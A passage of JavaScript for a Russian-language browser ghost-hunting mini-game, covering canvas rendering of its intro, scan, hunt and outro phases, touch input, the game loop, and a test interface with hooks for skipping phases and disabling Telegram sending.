    ctx.arc(cx, cy, 92 * pulse, 0, Math.PI * 2);
    ctx.fill();
    ctx.strokeStyle = '#7dffc4';
    ctx.lineWidth = 8;
    ctx.beginPath();
    ctx.arc(cx, cy, 70, 0, Math.PI * 2);
    ctx.stroke();
    ctx.lineCap = 'round';
    ctx.beginPath();
    ctx.moveTo(cx - 30, cy + 2);
    ctx.lineTo(cx - 8, cy + 24);
    ctx.lineTo(cx + 32, cy - 22);
    ctx.stroke();
    ctx.fillStyle = '#ffffff';
    ctx.font = "800 22px 'Nunito', sans-serif";
    ctx.fillText('Агент к заданию допущен', cx, cy + 128);
    ctx.fillStyle = '#d9cdf5';
    ctx.font = "600 14px 'Nunito', sans-serif";
    ctx.fillText('Призраки ждут в портале', cx, cy + 156);
  }

  function renderOutro() {
    const cx = VIEW.w / 2;
    ctx.fillStyle = '#ffffff';
    ctx.font = "800 20px 'Nunito', sans-serif";
    ctx.fillText('Миссия окончена', cx, 68);
    if (photo.video && photo.video.videoWidth) {
      const bw = 200;
      const bh = 267;
      const bx = cx - bw / 2;
      const by = 100;
      ctx.save();
      rr(ctx, bx, by, bw, bh, 14);
      ctx.clip();
      ctx.translate(bx + bw, by);
      ctx.scale(-1, 1);
      const v = photo.video;
      const s = Math.min(v.videoWidth, v.videoHeight);
      ctx.drawImage(v, (v.videoWidth - s) / 2, (v.videoHeight - s) / 2, s, s, 0, 0, bw, bh);
      ctx.restore();
      if (SHOW_CARD && photo.state === 'preview') {
        ctx.fillStyle = '#ffffff';
        ctx.font = "800 60px 'Nunito', sans-serif";
        ctx.fillText(String(Math.max(1, Math.ceil(photo.countdown))), cx, by + bh / 2);
      }
      return;
    }
    drawBody(OUTRO_TEXT, 16, 100, mainButtonRect().y - 20);
    if (!outroBusy) button('Дальше', mainButtonRect(), '#ffe066');
  }

  function render2D() {
    ctx.fillStyle = '#fff';
    ctx.font = "800 18px 'Nunito', sans-serif";
    ctx.fillText(`Волна ${hunt.wave + 1} из ${TOTAL_WAVES}`, VIEW.w / 2, 44);
    ctx.fillStyle = '#d9cdf5';
    ctx.font = "600 13px 'Nunito', sans-serif";
    ctx.fillText(`Изгнано: ${hunt.score}   ·   тапай по духам`, VIEW.w / 2, 70);
    for (const g of hunt.ghosts) drawGhost(g.x, g.y, g.r, g.t);
  }

  function render() {
    ctx.setTransform(1, 0, 0, 1, 0, 0);
    ctx.fillStyle = '#0f0b1f';
    ctx.fillRect(0, 0, W, H);
    ctx.setTransform(scale, 0, 0, scale, offX, offY);
    const bg = ctx.createLinearGradient(0, 0, 0, VIEW.h);
    bg.addColorStop(0, '#2a1c4d');
    bg.addColorStop(1, '#15102c');
    ctx.fillStyle = bg;
    ctx.fillRect(0, 0, VIEW.w, VIEW.h);
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';

    if (phase === 'intro') renderIntro();
    else if (phase === 'photo') renderPhoto();
    else if (phase === 'scan') renderScan();
    else if (phase === 'granted') renderGranted();
    else if (phase === 'hunt' && hunt.mode === '2d') render2D();
    else if (phase === 'hunt') {
      ctx.fillStyle = '#d9cdf5';
      ctx.font = "700 16px 'Nunito', sans-serif";
      ctx.fillText('Загружаю портал…', VIEW.w / 2, VIEW.h / 2);
    } else if (phase === 'outro' || phase === 'done') renderOutro();

    if (toastT > 0 && phase !== 'hunt') {
      ctx.fillStyle = 'rgba(20,14,40,0.82)';
      rr(ctx, VIEW.w / 2 - 150, 96, 300, 40, 12);
      ctx.fill();
      ctx.fillStyle = '#7dffc4';
      ctx.font = "800 15px 'Nunito', sans-serif";
      ctx.fillText(toast, VIEW.w / 2, 116);
    }
  }

  // ── Ввод ────────────────────────────────────────────────
  function inside(b, q) {
    const p = 14; // запас вокруг кнопки, чтобы тап попадал стабильно
    return q.x >= b.x - p && q.x <= b.x + b.w + p && q.y >= b.y - p && q.y <= b.y + b.h + p;
  }

  function onPointerDown(e) {
    if (phase === 'hunt' && hunt.mode === 'ar') return;
    e.preventDefault();
    const q = toLogical(e.clientX, e.clientY);
    if (phase === 'intro' && inside(mainButtonRect(), q)) {
      beginAccess();
    } else if (phase === 'scan') {
      scan.holding = true;
    } else if (phase === 'hunt' && hunt.mode === '2d') {
      zap2D(q);
    } else if (phase === 'outro' && !outroBusy && inside(mainButtonRect(), q)) {
      // жест тапа: камера для финального снимка запускается синхронно
      runOutro();
    }
  }

  function onPointerUp() {
    scan.holding = false;
  }

  // Тап по AR-экрану: запуск видео (жест для iOS) и проверка попадания.
  const onArPointer = (e) => {
    if (hunt.mode === 'ar') {
      playArVideo();
      tapAr(e);
    }
  };

  // ── Цикл ────────────────────────────────────────────────
  function step(dt) {
    t += dt;
    if (toastT > 0) toastT -= dt;
    if (phase === 'scan') stepScan(dt);
    else if (phase === 'granted') {
      scan.grantedT -= dt;
      if (scan.grantedT <= 0) enterHunt();
    } else if (phase === 'hunt') stepHunt(dt);
  }

  function frame(ts) {
    if (!running) return;
    raf = requestAnimationFrame(frame);
    if (document.hidden) {
      last = 0;
      return;
    }
    const dt = last ? Math.min(0.033, (ts - last) / 1000) : 1 / 60;
    last = ts;
    acc += dt;
    while (acc >= 1 / 60) {
      step(1 / 60);
      acc -= 1 / 60;
    }
    if (!(phase === 'hunt' && hunt.mode === 'ar')) render();
  }

  function finishRun() {
    if (finished) return;
    finished = true;
    stopPhotoCam();
    cleanupScene();
    window.scrollTo(0, 0);
    setTimeout(() => {
      if (onWin) onWin();
    }, 300);
    setTimeout(() => {
      running = false;
      if (raf) cancelAnimationFrame(raf);
    }, 500);
  }

  canvas.addEventListener('pointerdown', onPointerDown);
  canvas.addEventListener('pointerup', onPointerUp);
  canvas.addEventListener('pointercancel', onPointerUp);
  canvas.addEventListener('contextmenu', (e) => e.preventDefault());
  const onBlur = () => {
    scan.holding = false;
  };
  window.addEventListener('blur', onBlur);
  window.addEventListener('resize', setScale);
  if (container) container.addEventListener('pointerdown', onArPointer);

  setScale();
  if (onHint) onHint('Приветствуем, агент');

  return {
    start() {
      if (running) return;
      running = true;
      last = 0;
      acc = 0;
      raf = requestAnimationFrame(frame);
    },
    destroy() {
      running = false;
      if (raf) cancelAnimationFrame(raf);
      stopPhotoCam();
      cleanupScene();
      canvas.removeEventListener('pointerdown', onPointerDown);
      canvas.removeEventListener('pointerup', onPointerUp);
      canvas.removeEventListener('pointercancel', onPointerUp);
      window.removeEventListener('blur', onBlur);
      window.removeEventListener('resize', setScale);
      if (container) container.removeEventListener('pointerdown', onArPointer);
    },
    win() {
      finishRun();
    },
    getState() {
      return { phase, huntMode: hunt.mode, wave: hunt.wave + 1, score: hunt.score, sendState, finished };
    },
    test: {
      phase: () => phase,
      huntMode: () => hunt.mode,
      wave: () => hunt.wave + 1,
      score: () => hunt.score,
      ghosts: () => (hunt.mode === '2d' ? hunt.ghosts.length : 0),
      sendState: () => sendState,
      // имитация жестов и быстрых переходов для тестов
      begin: () => beginAccess(),
      skipPhoto: () => {
        if (phase === 'photo') enterScan();
      },
      skipScan: () => {
        if (phase === 'scan') {
          scan.progress = 1;
          enterGranted();
        }
      },
      completeHunt: () => {
        if (phase === 'hunt') enterOutro();
      },
      pressOutro: () => runOutro(),
      finish: () => finishRun(),
      // отключить отправку (тесты не делают сетевых запросов)
      disableTelegram: () => {
        tg = {};
      },
    },
  };
}
